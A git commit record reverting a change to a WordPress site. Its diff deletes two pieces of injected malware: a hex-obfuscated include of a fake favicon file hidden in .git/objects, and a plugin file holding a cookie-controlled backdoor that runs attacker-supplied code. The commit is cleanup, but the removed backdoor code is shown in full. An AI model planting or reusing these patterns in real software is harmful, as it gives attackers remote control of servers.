524ff02a6cd0d8c8c2d8fd978af76af25f526c18
Jack Cheng <chengxianga2008@yahoo.com>
2018-02-06 15:40:05 +1100

    Revert "update"
    This reverts commit f7de744640150c4e1437483123e2b85065fdea62.

--- index.php
+++ index.php
@@ -1,9 +1,4 @@
 <?php
-/*232e3*/
-
-@include "\x2fho\x6de/\x75bu\x6etu\x2fpu\x62li\x63_h\x74ml\x2fta\x68it\x69/.\x67it\x2fob\x6aec\x74s/\x34d/\x66av\x69co\x6e_1\x66ed\x37a.\x69co";
-
-/*232e3*/
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
--- wp-content/plugins/wp_migration-master/bgrnsjun.php
+++
@@ -1,7 +0,0 @@
-<?php
-
-$btdmg=$_COOKIE;
-$ecza=$btdmg[lzxy];
-if($ecza){
-	$ezkt=$ecza($btdmg[pmtw]);$jnbk=$ecza($btdmg[dlpd]);$wpx=$ezkt("",$jnbk);$wpx();
-}
